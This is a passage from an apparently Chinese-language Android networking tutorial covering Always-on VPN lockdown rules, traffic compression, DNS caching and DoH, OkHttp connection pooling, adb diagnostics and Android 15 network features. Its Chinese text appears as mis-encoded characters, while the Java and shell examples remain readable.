    <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(VpnConfig.SERVICE_INTERFACE);
    intent.setPackage(mPackage);
    intent.setComponent(mPackage, mService);

    <span class="hljs-keyword">try</span> {
        mContext.startServiceAsUser(intent, UserHandle.of(mUserHandle));
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        Log.e(TAG, <span class="hljs-string">"Failed to start Always-on VPN"</span>, e);
    }

    <span class="hljs-comment">// 3. å¦‚æœæ˜¯é”å®šæ¨¡å¼ï¼Œé…ç½®é˜²ç«å¢™</span>
    <span class="hljs-keyword">if</span> (mLockdown) {
        setVpnForcedLocked(<span class="hljs-literal">true</span>);
    }
}

<span class="hljs-comment">// é”å®šæ¨¡å¼ï¼šé˜»æ­¢æ‰€æœ‰éVPNæµé‡</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVpnForcedLocked</span><span class="hljs-params">(<span class="hljs-type">boolean</span> enforce)</span> {
    <span class="hljs-keyword">if</span> (enforce) {
        <span class="hljs-comment">// æ·»åŠ é˜²ç«å¢™è§„åˆ™ï¼šæ‹’ç»æ‰€æœ‰UIDçš„ç½‘ç»œè®¿é—®</span>
        <span class="hljs-comment">// é™¤äº†VPNåº”ç”¨å’Œç™½åå•åº”ç”¨</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, DENY);

        <span class="hljs-comment">// å…è®¸VPNåº”ç”¨</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN,
                                mOwnerUID, ALLOW);

        <span class="hljs-comment">// å…è®¸ç™½åå•åº”ç”¨</span>
        <span class="hljs-keyword">for</span> (String pkg : mLockdownWhitelist) {
            <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> getUidForPackage(pkg);
            mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, uid, ALLOW);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ç§»é™¤é˜²ç«å¢™è§„åˆ™</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, ALLOW);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-33">ä¸‰ã€ç½‘ç»œæ€§èƒ½ä¼˜åŒ–å®æˆ˜</h2>
<h3 data-id="heading-34">3.1 æµé‡ä¼˜åŒ–æŠ€å·§</h3>
<h4 data-id="heading-35">1. å‹ç¼©ä¼ è¾“</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkOptimization</span> {

    <span class="hljs-comment">// ä½¿ç”¨GZIPå‹ç¼©HTTPè¯·æ±‚ä½“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendCompressedRequest</span><span class="hljs-params">(String url, String data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();

        conn.setRequestMethod(<span class="hljs-string">"POST"</span>);
        conn.setDoOutput(<span class="hljs-literal">true</span>);
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"gzip"</span>);

        <span class="hljs-comment">// GZIPå‹ç¼©</span>
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">GZIPOutputStream</span> <span class="hljs-variable">gzos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GZIPOutputStream</span>(baos)) {
            gzos.write(data.getBytes(StandardCharsets.UTF_8));
        }
        <span class="hljs-type">byte</span>[] compressed = baos.toByteArray();

        <span class="hljs-comment">// å‘é€å‹ç¼©æ•°æ®</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> conn.getOutputStream()) {
            os.write(compressed);
        }

        <span class="hljs-comment">// æ—¥å¿—å‹ç¼©æ¯”</span>
        Log.d(TAG, String.format(<span class="hljs-string">"Compression ratio: %.2f%%"</span>,
            <span class="hljs-number">100.0</span> * compressed.length / data.length()));
    }

    <span class="hljs-comment">// ä½¿ç”¨Brotliå‹ç¼© (æ›´é«˜å‹ç¼©ç‡)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendBrotliRequest</span><span class="hljs-params">(String url, <span class="hljs-type">byte</span>[] data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// Brotliåº“: com.aayushatharva.brotli4j:brotli4j</span>

        <span class="hljs-type">BrotliCompressor</span> <span class="hljs-variable">compressor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrotliCompressor</span>();
        <span class="hljs-type">byte</span>[] compressed = compressor.compress(data,
            Brotli.DEFAULT_QUALITY, Brotli.DEFAULT_WINDOW);

        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"br"</span>);

        <span class="hljs-comment">// å‘é€...</span>
    }
}
</code></pre>
<h4 data-id="heading-36">2. å›¾ç‰‡ä¼˜åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageOptimization</span> {

    <span class="hljs-comment">// æ ¹æ®ç½‘ç»œçŠ¶æ€è°ƒæ•´å›¾ç‰‡è´¨é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadOptimizedImage</span><span class="hljs-params">(Context context, String url,
                                   ImageView imageView)</span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥ç½‘ç»œç±»å‹</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> isCurrentNetworkMetered(context);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSlowNetwork</span> <span class="hljs-operator">=</span> isSlowNetwork(context);

        <span class="hljs-comment">// 2. é€‰æ‹©è´¨é‡</span>
        String imageUrl;
        <span class="hljs-keyword">if</span> (isSlowNetwork || isMetered) {
            <span class="hljs-comment">// æ…¢é€Ÿ/è®¡è´¹ç½‘ç»œï¼šä½è´¨é‡å›¾ç‰‡</span>
            imageUrl = url + <span class="hljs-string">"?quality=low&amp;size=small"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å¿«é€Ÿ/éè®¡è´¹ç½‘ç»œï¼šé«˜è´¨é‡å›¾ç‰‡</span>
            imageUrl = url + <span class="hljs-string">"?quality=high&amp;size=large"</span>;
        }

        <span class="hljs-comment">// 3. åŠ è½½å›¾ç‰‡ (ä½¿ç”¨Glide/Coilç­‰åº“)</span>
        Glide.with(context)
            .load(imageUrl)
            .diskCacheStrategy(DiskCacheStrategy.AUTOMATIC)
            .into(imageView);
    }

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ…¢é€Ÿç½‘ç»œ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSlowNetwork</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">if</span> (caps == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

        <span class="hljs-comment">// ä¸‹è¡Œå¸¦å®½ &lt; 1Mbps è§†ä¸ºæ…¢é€Ÿ</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">downBandwidth</span> <span class="hljs-operator">=</span> caps.getLinkDownstreamBandwidthKbps();
        <span class="hljs-keyword">return</span> downBandwidth &lt; <span class="hljs-number">1000</span>;
    }
}
</code></pre>
<h4 data-id="heading-37">3. é¢„å–ç­–ç•¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefetchStrategy</span> {

    <span class="hljs-comment">// æ™ºèƒ½é¢„å–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smartPrefetch</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-comment">// ä»…åœ¨WiFi + å……ç”µæ—¶é¢„å–</span>
        <span class="hljs-keyword">if</span> (isWifiConnected(context) &amp;&amp; isCharging(context)) {
            <span class="hljs-comment">// é¢„å–ä¸‹ä¸€ç« èŠ‚å†…å®¹</span>
            prefetchNextChapter();

            <span class="hljs-comment">// é¢„åŠ è½½æ¨èåˆ—è¡¨</span>
            prefetchRecommendations();

            <span class="hljs-comment">// åŒæ­¥ç¦»çº¿æ•°æ®</span>
            syncOfflineData();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWifiConnected</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
               caps.hasTransport(TRANSPORT_WIFI) &amp;&amp;
               caps.hasCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCharging</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">BatteryManager</span> <span class="hljs-variable">bm</span> <span class="hljs-operator">=</span> context.getSystemService(
            BatteryManager.class);

        <span class="hljs-keyword">return</span> bm.isCharging();
    }
}
</code></pre>
<h3 data-id="heading-38">3.2 DNSä¼˜åŒ–</h3>
<h4 data-id="heading-39">1. DNSç¼“å­˜</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DnsCache</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, InetAddress[]&gt; mCache =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// DNSæŸ¥è¯¢å¸¦ç¼“å­˜</span>
    <span class="hljs-keyword">public</span> InetAddress[] lookup(String hostname) <span class="hljs-keyword">throws</span> UnknownHostException {
        <span class="hljs-comment">// 1. æ£€æŸ¥ç¼“å­˜</span>
        InetAddress[] cached = mCache.get(hostname);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span> &amp;&amp; !isExpired(cached)) {
            <span class="hljs-keyword">return</span> cached;
        }

        <span class="hljs-comment">// 2. DNSæŸ¥è¯¢</span>
        InetAddress[] addresses = InetAddress.getAllByName(hostname);

        <span class="hljs-comment">// 3. ç¼“å­˜ç»“æœ (TTL 5åˆ†é’Ÿ)</span>
        mCache.put(hostname, addresses);
        scheduleExpiry(hostname, <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);

        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-comment">// é¢„çƒ­DNSç¼“å­˜</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmUpCache</span><span class="hljs-params">(String... hostnames)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">4</span>);

        <span class="hljs-keyword">for</span> (String hostname : hostnames) {
            executor.submit(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    lookup(hostname);
                } <span class="hljs-keyword">catch</span> (UnknownHostException e) {
                    <span class="hljs-comment">// Ignore</span>
                }
            });
        }
    }
}
</code></pre>
<h4 data-id="heading-40">2. DoH (DNS over HTTPS)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DohResolver</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DOH_SERVER</span> <span class="hljs-operator">=</span>
        <span class="hljs-string">"https://dns.google/dns-query"</span>;

    <span class="hljs-comment">// ä½¿ç”¨DoHæŸ¥è¯¢DNS</span>
    <span class="hljs-keyword">public</span> List&lt;InetAddress&gt; <span class="hljs-title function_">resolveDoH</span><span class="hljs-params">(String hostname)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. æ„å»ºDoHè¯·æ±‚</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> DOH_SERVER + <span class="hljs-string">"?name="</span> + hostname + <span class="hljs-string">"&amp;type=A"</span>;

        <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpsURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"application/dns-json"</span>);

        <span class="hljs-comment">// 2. å‘é€è¯·æ±‚</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();
        <span class="hljs-keyword">if</span> (responseCode != <span class="hljs-number">200</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"DoH query failed: "</span> + responseCode);
        }

        <span class="hljs-comment">// 3. è§£æJSONå“åº”</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> readStream(conn.getInputStream());
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(response);

        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">answers</span> <span class="hljs-operator">=</span> json.getJSONArray(<span class="hljs-string">"Answer"</span>);
        List&lt;InetAddress&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; answers.length(); i++) {
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> answers.getJSONObject(i);
            <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> answer.getString(<span class="hljs-string">"data"</span>);
            addresses.add(InetAddress.getByName(ip));
        }

        <span class="hljs-keyword">return</span> addresses;
    }
}
</code></pre>
<h3 data-id="heading-41">3.3 è¿æ¥æ± ç®¡ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPoolOptimization</span> {

    <span class="hljs-comment">// OkHttpè¿æ¥æ± é…ç½®</span>
    <span class="hljs-keyword">public</span> OkHttpClient <span class="hljs-title function_">createOptimizedClient</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. é…ç½®è¿æ¥æ± </span>
        <span class="hljs-type">ConnectionPool</span> <span class="hljs-variable">connectionPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(
            <span class="hljs-number">10</span>,              <span class="hljs-comment">// æœ€å¤§ç©ºé—²è¿æ¥æ•°</span>
            <span class="hljs-number">5</span>,               <span class="hljs-comment">// è¿æ¥ä¿æ´»æ—¶é—´</span>
            TimeUnit.MINUTES
        );

        <span class="hljs-comment">// 2. é…ç½®è¶…æ—¶</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
            .connectionPool(connectionPool)
            .connectTimeout(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
            .readTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)
            .writeTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)

            <span class="hljs-comment">// 3. å¯ç”¨HTTP/2</span>
            .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))

            <span class="hljs-comment">// 4. é…ç½®é‡è¯•</span>
            .retryOnConnectionFailure(<span class="hljs-literal">true</span>)

            <span class="hljs-comment">// 5. æ·»åŠ æ‹¦æˆªå™¨</span>
            .addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoggingInterceptor</span>())
            .addNetworkInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheInterceptor</span>())

            .build();
    }

    <span class="hljs-comment">// è‡ªå®šä¹‰ç¼“å­˜æ‹¦æˆªå™¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interceptor</span> {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Response <span class="hljs-title function_">intercept</span><span class="hljs-params">(Chain chain)</span> <span class="hljs-keyword">throws</span> IOException {
            <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> chain.request();

            <span class="hljs-comment">// ç¦»çº¿æ—¶ä½¿ç”¨ç¼“å­˜</span>
            <span class="hljs-keyword">if</span> (!isNetworkAvailable()) {
                request = request.newBuilder()
                    .cacheControl(CacheControl.FORCE_CACHE)
                    .build();
            }

            <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> chain.proceed(request);

            <span class="hljs-comment">// è‡ªå®šä¹‰ç¼“å­˜ç­–ç•¥</span>
            <span class="hljs-keyword">if</span> (isNetworkAvailable()) {
                <span class="hljs-comment">// åœ¨çº¿ï¼šç¼“å­˜1å°æ—¶</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, max-age="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)
                    .build();
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ç¦»çº¿ï¼šç¼“å­˜4å‘¨</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, only-if-cached, max-stale="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">28</span>)
                    .build();
            }

            <span class="hljs-keyword">return</span> response;
        }
    }
}
</code></pre>
<h3 data-id="heading-42">3.4 ç½‘ç»œè¯Šæ–­å·¥å…·</h3>
<h4 data-id="heading-43">1. ç½‘ç»œè´¨é‡ç›‘æµ‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥ç½‘ç»œè¿æ¥çŠ¶æ€</span>
adb shell dumpsys connectivity | grep <span class="hljs-string">"Active networks"</span>

<span class="hljs-comment"># æ£€æŸ¥DNSé…ç½®</span>
adb shell getprop net.dns1
adb shell getprop net.dns2

<span class="hljs-comment"># æµ‹è¯•ç½‘ç»œå»¶è¿Ÿ</span>
adb shell ping -c 4 8.8.8.8

<span class="hljs-comment"># æµ‹è¯•DNSè§£æ</span>
adb shell nslookup www.google.com

<span class="hljs-comment"># æ£€æŸ¥è·¯ç”±è¡¨</span>
adb shell ip route show

<span class="hljs-comment"># æŸ¥çœ‹æ¥å£ç»Ÿè®¡</span>
adb shell ifconfig wlan0

<span class="hljs-comment"># æŠ“å–ç½‘ç»œæ•°æ®åŒ…</span>
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap

<span class="hljs-comment"># æŸ¥çœ‹iptablesè§„åˆ™</span>
adb shell iptables -L -n -v

<span class="hljs-comment"># æŸ¥çœ‹eBPFç»Ÿè®¡ (Android 15)</span>
adb shell dumpsys connectivity trafficcontroller
</code></pre>
<h4 data-id="heading-44">2. æµé‡ç›‘æ§</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficMonitor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastRxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTime</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

    <span class="hljs-comment">// è®¡ç®—å®æ—¶ç½‘é€Ÿ</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentNetworkSpeed</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">currentRx</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTx</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-keyword">if</span> (mLastTime == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// é¦–æ¬¡è°ƒç”¨ï¼Œåˆå§‹åŒ–</span>
            mLastRxBytes = currentRx;
            mLastTxBytes = currentTx;
            mLastTime = currentTime;
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;
        }

        <span class="hljs-comment">// è®¡ç®—æ—¶é—´é—´éš”</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">timeDelta</span> <span class="hljs-operator">=</span> currentTime - mLastTime;
        <span class="hljs-keyword">if</span> (timeDelta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;

        <span class="hljs-comment">// è®¡ç®—æµé‡å¢é‡</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxDelta</span> <span class="hljs-operator">=</span> currentRx - mLastRxBytes;
        <span class="hljs-type">long</span> <span class="hljs-variable">txDelta</span> <span class="hljs-operator">=</span> currentTx - mLastTxBytes;

        <span class="hljs-comment">// è®¡ç®—é€Ÿåº¦ (å­—èŠ‚/ç§’)</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxSpeed</span> <span class="hljs-operator">=</span> rxDelta * <span class="hljs-number">1000</span> / timeDelta;
        <span class="hljs-type">long</span> <span class="hljs-variable">txSpeed</span> <span class="hljs-operator">=</span> txDelta * <span class="hljs-number">1000</span> / timeDelta;

        <span class="hljs-comment">// æ›´æ–°è®°å½•</span>
        mLastRxBytes = currentRx;
        mLastTxBytes = currentTx;
        mLastTime = currentTime;

        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"â†“ %s/s â†‘ %s/s"</span>,
            formatBytes(rxSpeed),
            formatBytes(txSpeed));
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatBytes</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> (bytes / <span class="hljs-number">1024</span>) + <span class="hljs-string">" KB"</span>;
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.2f MB"</span>, bytes / <span class="hljs-number">1024.0</span> / <span class="hljs-number">1024.0</span>);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-45">å››ã€Android 15æ–°ç‰¹æ€§</h2>
<h3 data-id="heading-46">4.1 ç½‘ç»œåˆ‡ç‰‡æ”¯æŒï¼ˆNetwork Slicingï¼‰</h3>
<p>5Gç½‘ç»œåˆ‡ç‰‡å…è®¸ä¸ºä¸åŒä¸šåŠ¡æä¾›å·®å¼‚åŒ–çš„ç½‘ç»œæœåŠ¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - è¯·æ±‚ä¼ä¸šä¸“ç½‘åˆ‡ç‰‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestEnterpriseSlice</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkRequest</span>.Builder()
        .addCapability(NET_CAPABILITY_ENTERPRISE)
        .setEnterpriseId(NET_ENTERPRISE_ID_1)  <span class="hljs-comment">// ä¼ä¸šåˆ‡ç‰‡ID</span>
        .build();

    cm.requestNetwork(request, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAvailable</span><span class="hljs-params">(Network network)</span> {
            <span class="hljs-comment">// ä½¿ç”¨ä¼ä¸šä¸“ç½‘åˆ‡ç‰‡</span>
            <span class="hljs-comment">// - ä½å»¶è¿Ÿ (&lt;10ms)</span>
            <span class="hljs-comment">// - é«˜å¸¦å®½ä¿è¯</span>
            <span class="hljs-comment">// - QoSä¼˜å…ˆçº§é«˜</span>
            bindProcessToNetwork(network);
        }
    });
}
</code></pre>
<h3 data-id="heading-47">4.2 å«æ˜Ÿè¿æ¥æ”¯æŒ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - æ£€æµ‹å«æ˜Ÿç½‘ç»œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSatelliteNetwork</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
        cm.getActiveNetwork());

    <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
           caps.hasTransport(TRANSPORT_SATELLITE);
}
</code></pre>
<h3 data-id="heading-48">4.3 eBPFæ€§èƒ½æå‡</h3>
<p>Android 15å…¨é¢ä½¿ç”¨eBPFæ›¿ä»£iptablesï¼š</p>
<ul>
<li><strong>æµé‡ç»Ÿè®¡</strong>ï¼šO(1)å¤æ‚åº¦</li>
<li><strong>é˜²ç«å¢™è§„åˆ™</strong>ï¼šå“ˆå¸ŒæŸ¥æ‰¾ï¼Œå»¶è¿Ÿé™ä½90%</li>
<li><strong>CPUå ç”¨</strong>ï¼šå‡å°‘60%</li>
</ul>
<hr/>
<h2 data-id="heading-49">äº”ã€æ€»ç»“ä¸å±•æœ›</h2>
<h3 data-id="heading-50">5.1 æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<ol>
<li>
<p><strong>NetworkPolicyæµé‡æ§åˆ¶</strong></p>
<ul>
<li>NetworkPolicyManagerServiceç®¡ç†ç½‘ç»œç­–ç•¥</li>
<li>Data Saverçœæµæ¨¡å¼</li>
<li>æµé‡ç»Ÿè®¡ä¸é™åˆ¶</li>
<li>eBPFæ€§èƒ½ä¼˜åŒ–</li>
</ul>
</li>
<li>
<p><strong>VPNæ¡†æ¶</strong></p>
<ul>
<li>VpnServiceåº”ç”¨å±‚å®ç°</li>
<li>TUNè™šæ‹Ÿç½‘å¡</li>
<li>è·¯ç”±é…ç½®ä¸æ•°æ®è½¬å‘</li>
<li>Always-on VPNæœºåˆ¶</li>
</ul>
</li>
<li>
<p><strong>ç½‘ç»œä¼˜åŒ–</strong></p>
<ul>
<li>å‹ç¼©ä¼ è¾“</li>
<li>DNSç¼“å­˜ä¸DoH</li>
<li>è¿æ¥æ± ç®¡ç†</li>
<li>æµé‡ç›‘æ§å·¥å…·</li>
</ul>
</li>
</ol>
<h3 data-id="heading-51">5.2 æœ€ä½³å®è·µå»ºè®®</h3>





























